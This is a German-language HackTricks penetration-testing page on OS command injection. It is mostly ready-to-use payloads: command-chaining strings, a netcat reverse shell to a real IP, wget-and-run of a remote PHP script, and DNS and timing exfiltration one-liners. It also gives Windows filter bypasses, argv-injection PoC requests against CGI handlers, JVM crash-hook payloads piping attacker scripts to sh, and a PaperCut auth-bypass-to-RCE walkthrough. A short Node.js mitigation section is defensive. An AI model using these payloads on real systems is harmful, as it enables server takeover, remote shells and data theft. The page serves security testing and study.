# Command Injection

{{#include ../banners/hacktricks-training.md}}

## Was ist command Injection?

Eine **command injection** erlaubt einem Angreifer die Ausführung beliebiger Betriebssystembefehle auf dem Server, der eine Anwendung hostet. Infolgedessen können die Anwendung und alle ihre Daten vollständig kompromittiert werden. Die Ausführung dieser Befehle ermöglicht es dem Angreifer typischerweise, unautorisierten Zugriff auf die Umgebung der Anwendung und das zugrunde liegende System zu erlangen oder Kontrolle darüber zu übernehmen.

### Kontext

Je nachdem, **wo Ihre Eingabe injiziert wird**, müssen Sie möglicherweise den **zitierten Kontext terminieren** (mit `"` oder `'`), bevor Sie die Befehle ausführen.

## Command Injection/Execution
```bash
#Both Unix and Windows supported
ls||id; ls ||id; ls|| id; ls || id # Execute both
ls|id; ls |id; ls| id; ls | id # Execute both (using a pipe)
ls&&id; ls &&id; ls&& id; ls && id #  Execute 2º if 1º finish ok
ls&id; ls &id; ls& id; ls & id # Execute both but you can only see the output of the 2º
ls %0A id # %0A Execute both (RECOMMENDED)
ls%0abash%09-c%09"id"%0a   # (Combining new lines and tabs)

#Only unix supported
`ls` # ``
$(ls) # $()
ls; id # ; Chain commands
ls${LS_COLORS:10:1}${IFS}id # Might be useful

#Not executed but may be interesting
> /var/www/html/out.txt #Try to redirect the output to a file
< /etc/passwd #Try to send some input to the command
```
### **Einschränkungen** Bypasses

Wenn du versuchst, **beliebige Befehle in einer linux machine** auszuführen, wirst du daran interessiert sein, über diese **Bypasses** zu lesen:


{{#ref}}
../linux-hardening/bypass-bash-restrictions/
{{#endref}}

### **Beispiele**
```
vuln=127.0.0.1 %0a wget https://web.es/reverse.txt -O /tmp/reverse.php %0a php /tmp/reverse.php
vuln=127.0.0.1%0anohup nc -e /bin/bash 51.15.192.49 80
vuln=echo PAYLOAD > /tmp/pay.txt; cat /tmp/pay.txt | base64 -d > /tmp/pay; chmod 744 /tmp/pay; /tmp/pay
```
### Parameter

Hier sind die 25 wichtigsten Parameter, die für code injection und ähnliche RCE vulnerabilities anfällig sein könnten (von [link](https://twitter.com/trbughunters/status/1283133356922884096)):
```
?cmd={payload}
?exec={payload}
?command={payload}
?execute{payload}
?ping={payload}
?query={payload}
?jump={payload}
?code={payload}
?reg={payload}
?do={payload}
?func={payload}
?arg={payload}
?option={payload}
?load={payload}
?process={payload}
?step={payload}
?read={payload}
?function={payload}
?req={payload}
?feature={payload}
?exe={payload}
?module={payload}
?payload={payload}
?run={payload}
?print={payload}
```
### Time based data exfiltration

Daten extrahieren: char by char
```
swissky@crashlab▸ ~ ▸ $ time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
real    0m5.007s
user    0m0.000s
sys 0m0.000s

swissky@crashlab▸ ~ ▸ $ time if [ $(whoami|cut -c 1) == a ]; then sleep 5; fi
real    0m0.002s
user    0m0.000s
sys 0m0.000s
```
### DNS-basierte data exfiltration

Basierend auf dem Tool von `https://github.com/HoLyVieR/dnsbin`, das auch unter dnsbin.zhack.ca gehostet ist
```
1. Go to http://dnsbin.zhack.ca/
2. Execute a simple 'ls'
for i in $(ls /) ; do host "$i.3a43c7e4e57a8d0e2057.d.zhack.ca"; done
```

```
$(host $(wget -h|head -n1|sed 's/[ ,]/-/g'|tr -d '.').sudo.co.il)
```
Online-Tools zur Überprüfung auf DNS-based data exfiltration:

- dnsbin.zhack.ca
- pingb.in

### Filtering bypass

#### Windows
```
powershell C:**2\n??e*d.*? # notepad
@^p^o^w^e^r^shell c:**32\c*?c.e?e # calc
```
#### Linux


{{#ref}}
../linux-hardening/bypass-bash-restrictions/
{{#endref}}

### Node.js `child_process.exec` vs `execFile`

Beim Audit von JavaScript/TypeScript-Backends stößt man häufig auf die Node.js `child_process` API.
```javascript
// Vulnerable: user-controlled variables interpolated inside a template string
const { exec } = require('child_process');
exec(`/usr/bin/do-something --id_user ${id_user} --payload '${JSON.stringify(payload)}'`, (err, stdout) => {
/* … */
});
```
`exec()` startet eine **shell** (`/bin/sh -c`), daher führt jedes Zeichen, das für die shell eine besondere Bedeutung hat (back-ticks, `;`, `&&`, `|`, `$()`, …), zu **command injection**, wenn Benutzereingaben in den String eingefügt werden.

**Gegenmaßnahme:**  verwende `execFile()` (oder `spawn()` ohne die `shell`-Option) und übergebe **jedes Argument als separates Array-Element**, damit keine shell verwendet wird:
```javascript
const { execFile } = require('child_process');
execFile('/usr/bin/do-something', [
'--id_user', id_user,
'--payload', JSON.stringify(payload)
]);
```
Real-world case: *Synology Photos* ≤ 1.7.0-0794 was exploitable through an unauthenticated WebSocket event that placed attacker controlled data into `id_user` which was later embedded in an `exec()` call, achieving RCE (Pwn2Own Ireland 2024).

### Argument/Option injection via leading hyphen (argv, no shell metacharacters)

Nicht alle Injektionen erfordern shell metacharacters. Wenn die Anwendung nicht vertrauenswürdige Strings als Argumente an ein Systemutility übergibt (auch mit `execve`/`execFile` und ohne Shell), werden viele Programme dennoch jedes Argument, das mit `-` oder `--` beginnt, als Option parsen. Das erlaubt einem Angreifer, Modi zu kippen, Ausgabe-Pfade zu ändern oder gefährliches Verhalten auszulösen, ohne jemals in eine Shell einzubrechen.

Typische Orte, an denen das vorkommt:

- Eingebettete Web-UIs/CGI-Handler, die Befehle wie `ping <user>`, `tcpdump -i <iface> -w <file>`, `curl <url>`, etc. zusammenbauen.
- Zentrale CGI-Router (z. B. `/cgi-bin/<something>.cgi` mit einem Selector-Parameter wie `topicurl=<handler>`), bei denen mehrere Handler denselben schwachen Validator wiederverwenden.

Was zu versuchen ist:

- Gib Werte an, die mit `-`/`--` beginnen, damit sie als Flags vom nachgelagerten Tool interpretiert werden.
- Missbrauche Flags, die Verhalten ändern oder Dateien schreiben, zum Beispiel:
- `ping`: `-f`/`-c 100000` um das Gerät zu überlasten (DoS)
- `curl`: `-o /tmp/x` um beliebige Pfade zu schreiben, `-K <url>` um eine vom Angreifer kontrollierte Konfiguration zu laden
- `tcpdump`: `-G 1 -W 1 -z /path/script.sh` um nach der Rotation Ausführung in unsicheren Wrappern zu erreichen
- Wenn das Programm `--` end-of-options unterstützt, versuche naive Mitigations zu umgehen, die `--` an der falschen Stelle voranstellen.

Generic PoC shapes against centralized CGI dispatchers:
```
POST /cgi-bin/cstecgi.cgi HTTP/1.1
Content-Type: application/x-www-form-urlencoded

# Flip options in a downstream tool via argv injection
topicurl=<handler>&param=-n

# Unauthenticated RCE when a handler concatenates into a shell
topicurl=setEasyMeshAgentCfg&agentName=;id;
```
### JVM-Diagnose-Callbacks für garantierte Ausführung

Jede Möglichkeit, mit der Sie **JVM-Kommandozeilenargumente injizieren** (`_JAVA_OPTIONS`, launcher config files, `AdditionalJavaArguments` fields in desktop agents, etc.), lässt sich in eine zuverlässige RCE verwandeln, ohne den Anwendungs-Bytecode zu berühren:

1. **Erzwingen Sie einen deterministischen Absturz** durch Verkleinern des Metaspace oder Heaps: `-XX:MaxMetaspaceSize=16m` (oder ein kleines `-Xmx`). Das garantiert einen `OutOfMemoryError` selbst während des frühen Bootstraps.
2. **Einen Fehler-Hook anhängen**: `-XX:OnOutOfMemoryError="<cmd>"` oder `-XX:OnError="<cmd>"` führt einen beliebigen OS-Befehl aus, wann immer die JVM abbricht.
3. Fügen Sie optional `-XX:+CrashOnOutOfMemoryError` hinzu, um Wiederherstellungsversuche zu verhindern und das payload einmalig auszuführen.

Beispiel-Payloads:
```
-XX:MaxMetaspaceSize=16m -XX:OnOutOfMemoryError="cmd.exe /c powershell -nop -w hidden -EncodedCommand <blob>"
-XX:MaxMetaspaceSize=12m -XX:OnOutOfMemoryError="/bin/sh -c 'curl -fsS https://attacker/p.sh | sh'"
```
Weil diese diagnostics vom JVM selbst geparst werden, sind keine Shell-Metazeichen erforderlich und der Befehl läuft mit dem gleichen Integritätsniveau wie der Launcher. Desktop-IPC-Bugs, die vom Benutzer bereitgestellte JVM-Flags weiterreichen (siehe [Localhost WebSocket abuse](websocket-attacks.md#localhost-websocket-abuse--browser-port-discovery)), führen daher direkt zur OS-Befehlsausführung.

## PaperCut NG/MF SetupCompleted auth bypass -> print scripting RCE

- Verwundbare NG/MF-Builds (z. B. 22.0.5 Build 63914) exponieren `/app?service=page/SetupCompleted`; beim Aufrufen dieser Seite und Klicken auf **Login** wird ein gültiger `JSESSIONID` ohne Anmeldeinformationen zurückgegeben (authentication bypass in the setup flow).
- In **Options → Config Editor** setzen Sie `print-and-device.script.enabled=Y` und `print.script.sandboxed=N`, um printer scripting zu aktivieren und die Sandbox zu deaktivieren.
- Im Drucker-**Scripting**-Tab das Skript aktivieren und `printJobHook` definiert lassen, um Validierungsfehler zu vermeiden, aber die payload **außerhalb** der Funktion platzieren, damit sie sofort ausgeführt wird, wenn Sie auf **Apply** klicken (kein print job erforderlich):
```js
function printJobHook(inputs, actions) {}
cmd = ["bash","-c","curl http://attacker/hit"];
java.lang.Runtime.getRuntime().exec(cmd);
```
- Tausche den Callback gegen eine reverse shell; wenn die UI/PoC pipes/redirects nicht verarbeiten kann, stage ein payload mit einem Befehl und exec es mit einer zweiten Anfrage.
- Horizon3's [CVE-2023-27350.py](https://github.com/horizon3ai/CVE-2023-27350/blob/main/CVE-2023-27350.py) automatisiert den auth bypass, config flips, command execution und rollback — führe es über einen upstream proxy (z. B. `proxychains` → Squid) aus, wenn der Service nur intern erreichbar ist.

## Brute-Force-Erkennungsliste


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/command_injection.txt
{{#endref}}


## Referenzen

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
- [https://portswigger.net/web-security/os-command-injection](https://portswigger.net/web-security/os-command-injection)
- [Extraction of Synology encrypted archives – Synacktiv 2025](https://www.synacktiv.com/publications/extraction-des-archives-chiffrees-synology-pwn2own-irlande-2024.html)
- [PHP proc_open manual](https://www.php.net/manual/en/function.proc-open.php)
- [HTB Nocturnal: IDOR → Command Injection → Root via ISPConfig (CVE‑2023‑46818)](https://0xdf.gitlab.io/2025/08/16/htb-nocturnal.html)
- [Unit 42 – TOTOLINK X6000R: Three New Vulnerabilities Uncovered](https://unit42.paloaltonetworks.com/totolink-x6000r-vulnerabilities/)
- [When WebSockets Lead to RCE in CurseForge](https://elliott.diy/blog/curseforge/)
- [PaperCut NG/MF SetupCompleted auth bypass → print scripting RCE](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [CVE-2023-27350.py (auth bypass + print scripting automation)](https://github.com/horizon3ai/CVE-2023-27350/blob/main/CVE-2023-27350.py)

{{#include ../banners/hacktricks-training.md}}
